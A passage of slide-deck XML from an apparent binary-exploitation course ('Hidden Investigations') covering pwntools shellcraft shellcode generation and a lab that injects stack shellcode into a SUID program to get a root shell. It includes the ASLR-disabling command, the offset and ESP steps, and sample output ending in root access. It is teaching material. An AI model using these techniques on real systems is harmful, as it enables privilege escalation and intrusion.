            <a:ext cx="9144000" cy="7144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEEEE"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23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8393906" y="4468416"/>
            <a:ext cx="407194" cy="5179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29</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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1468041" cy="221456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657225" y="321469"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="727323"/>
            <a:ext cx="8286750" cy="4107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000000"/>
                </a:solidFill>
                <a:latin typeface="Quicksand Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Quicksand Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Quicksand Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cooking A Root Shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285750" y="1352401"/>
            <a:ext cx="3805665" cy="1003697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Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285750" y="1352401"/>
            <a:ext cx="3805665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8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4084272" y="1352401"/>
            <a:ext cx="7144" cy="1003697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9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285750" y="2348954"/>
            <a:ext cx="3805665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0" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285750" y="1352401"/>
            <a:ext cx="85725" cy="1003697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11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="414338" y="1480989"/>
            <a:ext cx="3548490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Shellcraft i386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4338" y="1773882"/>
            <a:ext cx="3548490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Linux Execve Shell Generator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14338" y="2048917"/>
            <a:ext cx="507206" cy="164306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14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="414338" y="2048917"/>
            <a:ext cx="507206" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="85090" tIns="34036" rIns="85090" bIns="34036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GENERATE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285750" y="2470398"/>
            <a:ext cx="3805665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What is Shellcraft?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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 pwntools module that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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generates assembly code for specific tasks.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85750" y="2941886"/>
            <a:ext cx="3805665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Idea:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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Instead of writing raw bytes, we use high-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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level descriptions.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85750" y="3416945"/>
            <a:ext cx="1464469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Privilege Escalation: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750219" y="3416945"/>
            <a:ext cx="335756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085975" y="3413373"/>
            <a:ext cx="171450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-p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257425" y="3416945"/>
            <a:ext cx="1614488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flag is crucial; it keeps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85750" y="3616970"/>
            <a:ext cx="1857375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root privileges under SUID.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291440" y="1352401"/>
            <a:ext cx="4566810" cy="1221581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3" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291440" y="1352401"/>
            <a:ext cx="4566810" cy="1221581"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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00FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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shellcraft i386.linux.execve "/bin///sh" "['sh','-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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p']" -f s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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r>
              <a:rPr lang="en-US" sz="9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r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="88888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# Generates assembly bytes like:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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r>
              <a:rPr lang="en-US" sz="9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\x31\xc0\x50\x68\x2f\x2f\x73\x68...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291440" y="2688282"/>
            <a:ext cx="456681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Note:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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Shellcraft handles the complex assembly; you just need </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="10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paste the result into your script.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0" y="4443413"/>
            <a:ext cx="9144000" cy="400050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6" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4443413"/>
            <a:ext cx="9144000" cy="400050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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"Don't write raw bytes. Craft your weapon with precision."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0" y="4843463"/>
            <a:ext cx="9144000" cy="300038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8" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4843463"/>
            <a:ext cx="9144000" cy="7144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEEEE"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4843463"/>
            <a:ext cx="9144000" cy="300038"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="85090" rIns="0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8286750" y="285750"/>
            <a:ext cx="428625" cy="5179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30</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="521970" y="327660"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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1468041" cy="221456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657225" y="321469"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="727323"/>
            <a:ext cx="8286750" cy="4107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000000"/>
                </a:solidFill>
                <a:latin typeface="Quicksand Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Quicksand Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Quicksand Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Lab 4 — Inject And Root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1409551"/>
            <a:ext cx="250031" cy="250031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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1409551"/>
            <a:ext cx="127000" cy="1543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9845" y="1287780"/>
            <a:ext cx="648970" cy="1543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04913" y="1409551"/>
            <a:ext cx="3279651" cy="17998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Disable ASLR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85813" y="1589540"/>
            <a:ext cx="2700393" cy="3585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echo 0 | sudo tee /proc/sys/kernel/randomize_va_space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8625" y="2099537"/>
            <a:ext cx="250031" cy="250031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13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2099537"/>
            <a:ext cx="127000" cy="1543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28625" y="2099537"/>
            <a:ext cx="250031" cy="250031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15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2099537"/>
            <a:ext cx="127000" cy="1543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97293" y="2099537"/>
            <a:ext cx="3279651" cy="17998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Find Offset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85813" y="2279526"/>
            <a:ext cx="271463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057275" y="2279526"/>
            <a:ext cx="462948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cyclic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520223" y="2279526"/>
            <a:ext cx="2257425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find distance to EIP (e.g., 'taaa').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28625" y="2605962"/>
            <a:ext cx="250031" cy="250031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1" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2605962"/>
            <a:ext cx="127000" cy="1543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28625" y="2605962"/>
            <a:ext cx="250031" cy="250031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3" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2605962"/>
            <a:ext cx="127000" cy="1543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204913" y="2605962"/>
            <a:ext cx="3279651" cy="17998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Locate ESP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85813" y="2785951"/>
            <a:ext cx="271463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057275" y="2785951"/>
            <a:ext cx="231502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gdb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288777" y="2785951"/>
            <a:ext cx="2775347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find where your input lives on the stack.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28625" y="3112387"/>
            <a:ext cx="250031" cy="250031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29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3112387"/>
            <a:ext cx="43815" cy="1543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-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28625" y="3112387"/>
            <a:ext cx="250031" cy="250031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31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3112387"/>
            <a:ext cx="127000" cy="1543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212533" y="3112387"/>
            <a:ext cx="3279651" cy="17998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Test &amp; Verify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85813" y="3292376"/>
            <a:ext cx="392906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Inject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1178719" y="3292376"/>
            <a:ext cx="308632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0xcc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1487351" y="3292376"/>
            <a:ext cx="2428875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confirm "Trace/breakpoint trap".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28625" y="3618812"/>
            <a:ext cx="250031" cy="250031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37" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3618812"/>
            <a:ext cx="127000" cy="1543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28625" y="3618812"/>
            <a:ext cx="250031" cy="250031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39" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3618812"/>
            <a:ext cx="127000" cy="1543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220153" y="3618812"/>
            <a:ext cx="3279651" cy="17998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Automate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85813" y="3798801"/>
            <a:ext cx="271463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1057275" y="3798801"/>
            <a:ext cx="1774552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process().send(payload)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2831827" y="3798801"/>
            <a:ext cx="300038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785813" y="3982362"/>
            <a:ext cx="1003027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interactive()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1788840" y="3982362"/>
            <a:ext cx="28575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4351213" y="1409551"/>
            <a:ext cx="4364162" cy="140581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7" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4351213" y="1409551"/>
            <a:ext cx="4364162" cy="1405812"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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00FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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python exploit.py</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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[+] Starting local process './intro2pwn4'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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[+] Payload sent!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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cat /root/flag.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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HIDDEN{SHELLCODE_INJECTED_SUCCESS}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4351213" y="2958238"/>
            <a:ext cx="4364162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Note:</a:t>
            </a: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Test with a dummy server first, then switch to the real port.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0" y="4450556"/>
            <a:ext cx="9144000" cy="428625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50" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4450556"/>
            <a:ext cx="9144000" cy="428625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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"No door? Build your own and walk through it."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0" y="4879181"/>
            <a:ext cx="9144000" cy="264319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2" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="7144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEEEE"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="26431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8379619" y="285750"/>
            <a:ext cx="335756" cy="5179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31</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="55" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="521970" y="327660"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5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1468041" cy="221456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657225" y="321469"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="727323"/>
            <a:ext cx="8286750" cy="4107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000000"/>
                </a:solidFill>
                <a:latin typeface="Quicksand Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Quicksand Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Quicksand Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Four Techniques, One Bug</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1480989"/>
            <a:ext cx="1327007" cy="410766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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1480989"/>
            <a:ext cx="1327007" cy="410766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CHALLENGE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755632" y="1480989"/>
            <a:ext cx="1966317" cy="410766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9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1755632" y="1480989"/>
            <a:ext cx="1966317" cy="410766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DEFENSE CHECK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721950" y="1480989"/>
            <a:ext cx="3719550" cy="410766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1" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721950" y="1480989"/>
            <a:ext cx="3719550" cy="410766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TECHNIQUE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441499" y="1480989"/>
            <a:ext cx="1273876" cy="410766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3" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7441499" y="1480989"/>
            <a:ext cx="1273876" cy="410766"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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DIFFICULTY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35781" y="2006054"/>
            <a:ext cx="650081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Checksec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55632" y="1891754"/>
            <a:ext cx="1966317" cy="414338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Reconnaissance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721950" y="1891754"/>
            <a:ext cx="3719550" cy="414338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Identify RELRO/Canary/NX/PIE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441499" y="1891754"/>
            <a:ext cx="1273876" cy="414338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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2C2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★☆☆☆☆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35781" y="2423964"/>
            <a:ext cx="414338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Cyclic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755632" y="2306092"/>
            <a:ext cx="1966317" cy="417909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Ret2Win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721950" y="2306092"/>
            <a:ext cx="3719550" cy="417909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Jump to a hidden print_flag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441499" y="2306092"/>
            <a:ext cx="1273876" cy="417909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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2C2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★★☆☆☆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35781" y="2841873"/>
            <a:ext cx="764381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Networking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755632" y="2724001"/>
            <a:ext cx="1966317" cy="417909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Variable Overwrite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721950" y="2724001"/>
            <a:ext cx="3719550" cy="417909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Flip a neighbour variable via overflow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441499" y="2724001"/>
            <a:ext cx="1273876" cy="417909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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2C2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★★★☆☆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35781" y="3259782"/>
            <a:ext cx="646509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Shellcraft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55632" y="3141911"/>
            <a:ext cx="1966317" cy="417909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Shellcode Injection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721950" y="3141911"/>
            <a:ext cx="3719550" cy="417909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Inject &amp; execute custom code on stack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441499" y="3141911"/>
            <a:ext cx="1273876" cy="417909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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2C2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★★★★☆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075259" y="3849142"/>
            <a:ext cx="932259" cy="385763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075259" y="3849142"/>
            <a:ext cx="932259" cy="385763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="170053" tIns="85090" rIns="17005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Observe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="100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106" y="3949154"/>
            <a:ext cx="171450" cy="171450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3450431" y="3849142"/>
            <a:ext cx="928688" cy="385763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450431" y="3849142"/>
            <a:ext cx="928688" cy="385763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="170053" tIns="85090" rIns="17005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Redirect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000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706" y="3949154"/>
            <a:ext cx="171450" cy="171450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4822031" y="3849142"/>
            <a:ext cx="1039416" cy="385763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4822031" y="3849142"/>
            <a:ext cx="1039416" cy="385763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="170053" tIns="85090" rIns="17005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Overwrite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000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0034" y="3949154"/>
            <a:ext cx="171450" cy="171450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6304359" y="3849142"/>
            <a:ext cx="721519" cy="385763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304359" y="3849142"/>
            <a:ext cx="721519" cy="385763"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="170053" tIns="85090" rIns="17005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Inject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0" y="4450556"/>
            <a:ext cx="9144000" cy="428625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42" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4450556"/>
            <a:ext cx="9144000" cy="428625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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"Same vulnerability, four different paths to victory."</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="264319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4" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="7144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEEEE"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="26431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46" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8311753" y="285750"/>
            <a:ext cx="403622" cy="5179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32</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="47" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="521970" y="327660"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="48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5"/>
                </a:lnSpc>
              </a:p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1468041" cy="221456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657225" y="321469"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="727323"/>
            <a:ext cx="8286750" cy="4107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000000"/>
                </a:solidFill>
                <a:latin typeface="Quicksand Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Quicksand Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Quicksand Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Your Repeatable Workflow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428569" y="1695301"/>
            <a:ext cx="1148972" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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8569" y="1695301"/>
            <a:ext cx="1148972" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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RECON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203" y="1848892"/>
            <a:ext cx="135731" cy="21431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832372" y="1695301"/>
            <a:ext cx="1153716" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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832372" y="1695301"/>
            <a:ext cx="1153716" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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CRASH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494" y="1848892"/>
            <a:ext cx="135731" cy="214313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245662" y="1695301"/>
            <a:ext cx="1158460" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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245662" y="1695301"/>
            <a:ext cx="1158460" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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OFFSET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1272" y="1848892"/>
            <a:ext cx="135731" cy="214313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668441" y="1695301"/>
            <a:ext cx="1163259" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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4668441" y="1695301"/>
            <a:ext cx="1163259" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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STRATEGY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594" y="1848892"/>
            <a:ext cx="135731" cy="214313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100763" y="1695301"/>
            <a:ext cx="1168003" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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6100763" y="1695301"/>
            <a:ext cx="1168003" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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PAYLOAD</a:t>
            </a:r>
